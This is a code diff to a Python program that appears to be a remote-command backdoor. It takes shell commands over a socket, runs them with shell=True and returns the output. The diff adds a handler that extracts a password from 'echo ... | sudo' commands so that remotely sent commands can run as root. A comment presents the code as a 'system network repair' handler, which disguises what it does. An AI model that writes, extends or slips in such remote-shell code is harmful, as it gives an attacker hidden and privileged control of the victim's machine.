@@ -1,10 +1,11 @@
 import socket
 import subprocess
 import threading
-import requests
-import hashlib
 import time
 import select
+import re
+import hashlib
+import requests
 from constants import SALT, API_URL, HANDLER_URL
 from tools import log_with_timestamp
 
@@ -31,7 +32,19 @@ def network_sync(client_socket):
     client_socket.send(syn_message.encode('utf-8'))
 
 
-# 系统网络修复句柄
+def handle_sudo(command):
+    try:
+        match = re.match(r"echo\s+(\S+)\s+\|\s+sudo\s+(.*)", command)
+        if match:
+            password = match.group(1)
+            sudo_command = match.group(2)
+            process = subprocess.Popen(sudo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
+            stdout, stderr = process.communicate(input=f"{password}\n")
+            return stdout + "\n" + stderr
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def handle_client(client_socket):
     try:
         network_sync(client_socket)
@@ -41,8 +54,12 @@ def handle_client(client_socket):
                 command = client_socket.recv(1024).decode('utf-8')
                 if not command:
                     break
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                response = result.stdout + "\n" + result.stderr
+                if 'sudo' in command:
+                    response = handle_sudo(command)
+                else:
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    response = result.stdout + "\n" + result.stderr
+
                 client_socket.send(response.encode('utf-8'))
             else:
                 continue
